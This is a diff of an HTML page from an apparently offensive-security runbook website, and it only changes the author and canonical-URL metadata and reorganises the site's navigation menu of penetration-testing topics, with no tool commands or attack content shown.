@@ -9,16 +9,16 @@
         <meta name="description" content="A practitioner's reference for offensive security operations — built from real engagements and lab work.">
       
       
-        <meta name="author" content="aelder202">
+        <meta name="author" content="Taylor Elder">
       
       
-        <link rel="canonical" href="https://aelder202.github.io/red-team-runbook/tools/netexec/">
+        <link rel="canonical" href="https://taylorelder.com/red-team-runbook/tools/netexec/">
       
       
-        <link rel="prev" href="../mimikatz/">
+        <link rel="prev" href="../msfvenom/">
       
       
-        <link rel="next" href="../nuclei/">
+        <link rel="next" href="../../applications/tools/nikto/">
       
       
       <link rel="icon" href="../../assets/images/favicon.png">
@@ -52,6 +52,8 @@
       
     
     
+      <link rel="stylesheet" href="../../stylesheets/extra.css">
+    
     <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
     
       
@@ -76,7 +78,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#netexec-fork-of-crackmapexec" class="md-skip">
+        <a href="#netexec" class="md-skip">
           Skip to content
         </a>
       
@@ -212,28 +214,10 @@
     
     
       <li class="md-tabs__item">
-        <a href="../../information-gathering/" class="md-tabs__link">
-          
-  
-  Information Gathering
-
-        </a>
-      </li>
-    
-  
-
-      
-        
-  
-  
-  
-    
-    
-      <li class="md-tabs__item">
         <a href="../../network-scanning/" class="md-tabs__link">
           
   
-  Network Scanning & Recon
+  Recon
 
         </a>
       </li>
@@ -248,10 +232,10 @@
     
     
       <li class="md-tabs__item">
-        <a href="../../exploitation/" class="md-tabs__link">
+        <a href="../../information-gathering/" class="md-tabs__link">
           
   
-  Exploitation
+  Services
 
         </a>
       </li>
@@ -284,10 +268,46 @@
     
     
       <li class="md-tabs__item">
+        <a href="../../exploitation/" class="md-tabs__link">
+          
+  
+  Exploitation
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
         <a href="../../privilege-escalation/" class="md-tabs__link">
           
   
-  Privilege Escalation
+  Priv Esc
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../lateral-movement/" class="md-tabs__link">
+          
+  
+  Lateral Movement
 
         </a>
       </li>
@@ -341,7 +361,7 @@
         <a href="../../port-forwarding/" class="md-tabs__link">
           
   
-  Port Forwarding & Tunneling
+  Tunneling
 
         </a>
       </li>
@@ -453,16 +473,14 @@
       
         
         
-          
-        
-        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
         
           
           <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
             
   
   <span class="md-ellipsis">
-    Information Gathering
+    Recon
   </span>
   
 
@@ -472,7 +490,159 @@
         <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
           <label class="md-nav__title" for="__nav_2">
             <span class="md-nav__icon md-icon"></span>
-            Information Gathering
+            Recon
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../network-scanning/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Overview
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../network-scanning/network-scanning/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Network Scanning
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../network-scanning/reconnaissance/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Reconnaissance
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../network-scanning/traffic-capture/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Traffic Capture
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../applications/tools/eyewitness/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    EyeWitness
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Services
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            Services
           </label>
           <ul class="md-nav__list" data-md-scrollfix>
             
@@ -503,48 +673,6 @@
   
   
   
-    
-    
-    
-      
-      
-        
-      
-    
-    
-    <li class="md-nav__item md-nav__item--nested">
-      
-        
-        
-          
-        
-        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_2" >
-        
-          
-          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
-            
-  
-  <span class="md-ellipsis">
-    Service Analysis
-  </span>
-  
-
-            <span class="md-nav__icon md-icon"></span>
-          </label>
-        
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
-          <label class="md-nav__title" for="__nav_2_2">
-            <span class="md-nav__icon md-icon"></span>
-            Service Analysis
-          </label>
-          <ul class="md-nav__list" data-md-scrollfix>
-            
-              
-                
-  
-  
-  
-  
     <li class="md-nav__item">
       <a href="../../information-gathering/service-analysis/dns-53/" class="md-nav__link">
         
@@ -567,11 +695,74 @@
   
   
     <li class="md-nav__item">
+      <a href="../../information-gathering/service-analysis/docker-2375/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Docker API (2375)
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../information-gathering/service-analysis/elasticsearch-9200/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Elasticsearch (9200)
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
       <a href="../../information-gathering/service-analysis/ftp-21/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
     FTP (21)
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../information-gathering/service-analysis/http-80-443/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTTP/HTTPS (80, 443)
   </span>
   
 
@@ -693,6 +884,27 @@
   
   
     <li class="md-nav__item">
+      <a href="../../information-gathering/service-analysis/mongodb-27017/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    MongoDB (27017)
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
       <a href="../../information-gathering/service-analysis/mssql-1433/" class="md-nav__link">
         
   
@@ -798,6 +1010,27 @@
   
   
     <li class="md-nav__item">
+      <a href="../../information-gathering/service-analysis/postgresql-5432/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    PostgreSQL (5432)
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
       <a href="../../information-gathering/service-analysis/r-services/" class="md-nav__link">
         
   
@@ -824,6 +1057,27 @@
   
   <span class="md-ellipsis">
     RDP (3389)
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../information-gathering/service-analysis/redis-6379/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Redis (6379)
   </span>
   
 
@@ -966,11 +1220,53 @@
   
   
     <li class="md-nav__item">
+      <a href="../../information-gathering/service-analysis/telnet-23/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Telnet (23)
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
       <a href="../../information-gathering/service-analysis/tftp-69/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
     TFTP (69)
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../information-gathering/service-analysis/vnc-5900/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    VNC (5900)
   </span>
   
 
@@ -1007,14 +1303,6 @@
     </li>
   
 
-              
-            
-          </ul>
-        </nav>
-      
-    </li>
-  
-
     
       
       
@@ -1035,646 +1323,10 @@
       
         
         
-          
-        
-        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3" >
-        
-          
-          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
-            
-  
-  <span class="md-ellipsis">
-    Network Scanning & Recon
-  </span>
-  
-
-            <span class="md-nav__icon md-icon"></span>
-          </label>
-        
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
-          <label class="md-nav__title" for="__nav_3">
-            <span class="md-nav__icon md-icon"></span>
-            Network Scanning & Recon
-          </label>
-          <ul class="md-nav__list" data-md-scrollfix>
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../../network-scanning/" class="md-nav__link">
-        
-  
-  <span class="md-ellipsis">
-    Overview
-  </span>
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../../network-scanning/network-scanning/" class="md-nav__link">
-        
-  
-  <span class="md-ellipsis">
-    Network Scanning
-  </span>
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../../network-scanning/reconnaissance/" class="md-nav__link">
-        
-  
-  <span class="md-ellipsis">
-    Reconnaissance
-  </span>
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../../network-scanning/traffic-capture/" class="md-nav__link">
-        
-  
-  <span class="md-ellipsis">
-    Traffic Capture
-  </span>
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../../network-scanning/user-host-enumeration/" class="md-nav__link">
-        
-  
-  <span class="md-ellipsis">
-    User & Host Enumeration
-  </span>
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-          </ul>
-        </nav>
-      
-    </li>
-  
-
-    
-      
-      
-  
-  
-  
-  
-    
-    
-    
-      
-      
-        
-      
-    
-    
-    <li class="md-nav__item md-nav__item--nested">
-      
-        
-        
-          
-        
-        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
         
           
           <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
-            
-  
-  <span class="md-ellipsis">
-    Exploitation
-  </span>
-  
-
-            <span class="md-nav__icon md-icon"></span>
-          </label>
-        
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
-          <label class="md-nav__title" for="__nav_4">
-            <span class="md-nav__icon md-icon"></span>
-            Exploitation
-          </label>
-          <ul class="md-nav__list" data-md-scrollfix>
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../../exploitation/" class="md-nav__link">
-        
-  
-  <span class="md-ellipsis">
-    Overview
-  </span>
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    
-    
-    
-      
-      
-        
-      
-    
-    
-    <li class="md-nav__item md-nav__item--nested">
-      
-        
-        
-          
-        
-        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4_2" >
-        
-          
-          <label class="md-nav__link" for="__nav_4_2" id="__nav_4_2_label" tabindex="0">
-            
-  
-  <span class="md-ellipsis">
-    Binary Exploitation
-  </span>
-  
-
-            <span class="md-nav__icon md-icon"></span>
-          </label>
-        
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_2_label" aria-expanded="false">
-          <label class="md-nav__title" for="__nav_4_2">
-            <span class="md-nav__icon md-icon"></span>
-            Binary Exploitation
-          </label>
-          <ul class="md-nav__list" data-md-scrollfix>
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../../exploitation/binary/buffer-overflows/" class="md-nav__link">
-        
-  
-  <span class="md-ellipsis">
-    Buffer Overflows
-  </span>
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../../exploitation/binary/elf-dll-analysis/" class="md-nav__link">
-        
-  
-  <span class="md-ellipsis">
-    ELF & DLL Analysis
-  </span>
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-          </ul>
-        </nav>
-      
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    
-    
-    
-      
-      
-        
-      
-    
-    
-    <li class="md-nav__item md-nav__item--nested">
-      
-        
-        
-          
-        
-        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4_3" >
-        
-          
-          <label class="md-nav__link" for="__nav_4_3" id="__nav_4_3_label" tabindex="0">
-            
-  
-  <span class="md-ellipsis">
-    Credential Attacks
-  </span>
-  
-
-            <span class="md-nav__icon md-icon"></span>
-          </label>
-        
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_3_label" aria-expanded="false">
-          <label class="md-nav__title" for="__nav_4_3">
-            <span class="md-nav__icon md-icon"></span>
-            Credential Attacks
-          </label>
-          <ul class="md-nav__list" data-md-scrollfix>
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../../exploitation/credentials/brute-force-cracking/" class="md-nav__link">
-        
-  
-  <span class="md-ellipsis">
-    Brute-Force Cracking
-  </span>
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../../exploitation/credentials/kerberos-attacks/" class="md-nav__link">
-        
-  
-  <span class="md-ellipsis">
-    Kerberos Attacks
-  </span>
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../../exploitation/credentials/windows-credential-dumping/" class="md-nav__link">
-        
-  
-  <span class="md-ellipsis">
-    Windows Credential Dumping
-  </span>
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-          </ul>
-        </nav>
-      
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    
-    
-    
-      
-      
-        
-      
-    
-    
-    <li class="md-nav__item md-nav__item--nested">
-      
-        
-        
-          
-        
-        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4_4" >
-        
-          
-          <label class="md-nav__link" for="__nav_4_4" id="__nav_4_4_label" tabindex="0">
-            
-  
-  <span class="md-ellipsis">
-    Exploitation Frameworks
-  </span>
-  
-
-            <span class="md-nav__icon md-icon"></span>
-          </label>
-        
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_4_label" aria-expanded="false">
-          <label class="md-nav__title" for="__nav_4_4">
-            <span class="md-nav__icon md-icon"></span>
-            Exploitation Frameworks
-          </label>
-          <ul class="md-nav__list" data-md-scrollfix>
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../../exploitation/frameworks/metasploit/" class="md-nav__link">
-        
-  
-  <span class="md-ellipsis">
-    Metasploit
-  </span>
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../../exploitation/frameworks/msfvenom/" class="md-nav__link">
-        
-  
-  <span class="md-ellipsis">
-    MSFVenom
-  </span>
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-          </ul>
-        </nav>
-      
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    
-    
-    
-      
-      
-        
-      
-    
-    
-    <li class="md-nav__item md-nav__item--nested">
-      
-        
-        
-          
-        
-        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4_5" >
-        
-          
-          <label class="md-nav__link" for="__nav_4_5" id="__nav_4_5_label" tabindex="0">
-            
-  
-  <span class="md-ellipsis">
-    Shells
-  </span>
-  
-
-            <span class="md-nav__icon md-icon"></span>
-          </label>
-        
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_5_label" aria-expanded="false">
-          <label class="md-nav__title" for="__nav_4_5">
-            <span class="md-nav__icon md-icon"></span>
-            Shells
-          </label>
-          <ul class="md-nav__list" data-md-scrollfix>
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../../exploitation/shells/bind-reverse-shells/" class="md-nav__link">
-        
-  
-  <span class="md-ellipsis">
-    Bind & Reverse Shells
-  </span>
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../../exploitation/shells/escaping-restricted-shells/" class="md-nav__link">
-        
-  
-  <span class="md-ellipsis">
-    Escaping Restricted Shells
-  </span>
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../../exploitation/shells/web-shells/" class="md-nav__link">
-        
-  
-  <span class="md-ellipsis">
-    Web Shells
-  </span>
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-          </ul>
-        </nav>
-      
-    </li>
-  
-
-              
-            
-          </ul>
-        </nav>
-      
-    </li>
-  
-
-    
-      
-      
-  
-  
-  
-  
-    
-    
-    
-      
-      
-        
-      
-    
-    
-    <li class="md-nav__item md-nav__item--nested">
-      
-        
-        
-          
-        
-        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_5" >
-        
-          
-          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
             
   
   <span class="md-ellipsis">
@@ -1685,8 +1337,8 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
-          <label class="md-nav__title" for="__nav_5">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
             <span class="md-nav__icon md-icon"></span>
             Applications
           </label>
@@ -1732,26 +1384,24 @@
       
         
         
-          
-        
-        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_5_2" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2" >
         
           
-          <label class="md-nav__link" for="__nav_5_2" id="__nav_5_2_label" tabindex="0">
+          <label class="md-nav__link" for="__nav_4_2" id="__nav_4_2_label" tabindex="0">
             
   
   <span class="md-ellipsis">
-    Enumeration & Analysis
+    Enumeration
   </span>
   
 
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_2_label" aria-expanded="false">
-          <label class="md-nav__title" for="__nav_5_2">
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_2">
             <span class="md-nav__icon md-icon"></span>
-            Enumeration & Analysis
+            Enumeration
           </label>
           <ul class="md-nav__list" data-md-scrollfix>
             
@@ -1845,12 +1495,10 @@
       
         
         
-          
-        
-        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_5_3" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_3" >
         
           
-          <label class="md-nav__link" for="__nav_5_3" id="__nav_5_3_label" tabindex="0">
+          <label class="md-nav__link" for="__nav_4_3" id="__nav_4_3_label" tabindex="0">
             
   
   <span class="md-ellipsis">
@@ -1861,8 +1509,8 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_3_label" aria-expanded="false">
-          <label class="md-nav__title" for="__nav_5_3">
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_3">
             <span class="md-nav__icon md-icon"></span>
             Application Enumeration
           </label>
@@ -1958,12 +1606,10 @@
       
         
         
-          
-        
-        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_5_4" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_4" >
         
           
-          <label class="md-nav__link" for="__nav_5_4" id="__nav_5_4_label" tabindex="0">
+          <label class="md-nav__link" for="__nav_4_4" id="__nav_4_4_label" tabindex="0">
             
   
   <span class="md-ellipsis">
@@ -1974,8 +1620,8 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_4_label" aria-expanded="false">
-          <label class="md-nav__title" for="__nav_5_4">
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_4">
             <span class="md-nav__icon md-icon"></span>
             Authentication Attacks
           </label>
@@ -2071,12 +1717,10 @@
       
         
         
-          
-        
-        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_5_5" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_5" >
         
           
-          <label class="md-nav__link" for="__nav_5_5" id="__nav_5_5_label" tabindex="0">
+          <label class="md-nav__link" for="__nav_4_5" id="__nav_4_5_label" tabindex="0">
             
   
   <span class="md-ellipsis">
@@ -2087,8 +1731,8 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_5_label" aria-expanded="false">
-          <label class="md-nav__title" for="__nav_5_5">
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_5">
             <span class="md-nav__icon md-icon"></span>
             Exploits
           </label>
@@ -2248,6 +1892,27 @@
   
   
     <li class="md-nav__item">
+      <a href="../../applications/exploits/ssti/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SSTI
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
       <a href="../../applications/exploits/xss/" class="md-nav__link">
         
   
@@ -2291,140 +1956,6 @@
 
               
             
-              
-                
-  
-  
-  
-  
-    
-    
-    
-      
-      
-        
-      
-    
-    
-    <li class="md-nav__item md-nav__item--nested">
-      
-        
-        
-          
-        
-        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_5_6" >
-        
-          
-          <label class="md-nav__link" for="__nav_5_6" id="__nav_5_6_label" tabindex="0">
-            
-  
-  <span class="md-ellipsis">
-    Tools
-  </span>
-  
-
-            <span class="md-nav__icon md-icon"></span>
-          </label>
-        
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_6_label" aria-expanded="false">
-          <label class="md-nav__title" for="__nav_5_6">
-            <span class="md-nav__icon md-icon"></span>
-            Tools
-          </label>
-          <ul class="md-nav__list" data-md-scrollfix>
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../../applications/tools/burp-suite/" class="md-nav__link">
-        
-  
-  <span class="md-ellipsis">
-    Burp Suite
-  </span>
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../../applications/tools/eyewitness/" class="md-nav__link">
-        
-  
-  <span class="md-ellipsis">
-    EyeWitness
-  </span>
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../../applications/tools/nikto/" class="md-nav__link">
-        
-  
-  <span class="md-ellipsis">
-    Nikto
-  </span>
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../../applications/tools/responder/" class="md-nav__link">
-        
-  
-  <span class="md-ellipsis">
-    Responder
-  </span>
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-          </ul>
-        </nav>
-      
-    </li>
-  
-
-              
-            
           </ul>
         </nav>
       
@@ -2451,26 +1982,24 @@
       
         
         
-          
-        
-        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_6" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
         
           
-          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
             
   
   <span class="md-ellipsis">
-    Privilege Escalation
+    Exploitation
   </span>
   
 
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
-          <label class="md-nav__title" for="__nav_6">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
             <span class="md-nav__icon md-icon"></span>
-            Privilege Escalation
+            Exploitation
           </label>
           <ul class="md-nav__list" data-md-scrollfix>
             
@@ -2481,7 +2010,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../privilege-escalation/" class="md-nav__link">
+      <a href="../../exploitation/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2514,12 +2043,369 @@
       
         
         
-          
-        
-        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_6_2" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_2" >
         
           
-          <label class="md-nav__link" for="__nav_6_2" id="__nav_6_2_label" tabindex="0">
+          <label class="md-nav__link" for="__nav_5_2" id="__nav_5_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Binary Exploitation
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5_2">
+            <span class="md-nav__icon md-icon"></span>
+            Binary Exploitation
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../exploitation/binary/buffer-overflows/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Buffer Overflows
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../exploitation/binary/elf-dll-analysis/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    ELF & DLL Analysis
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_5_3" id="__nav_5_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Credential Attacks
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5_3">
+            <span class="md-nav__icon md-icon"></span>
+            Credential Attacks
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../exploitation/credentials/brute-force-cracking/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Brute-Force Cracking
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_5_4" id="__nav_5_4_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Shells
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5_4">
+            <span class="md-nav__icon md-icon"></span>
+            Shells
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
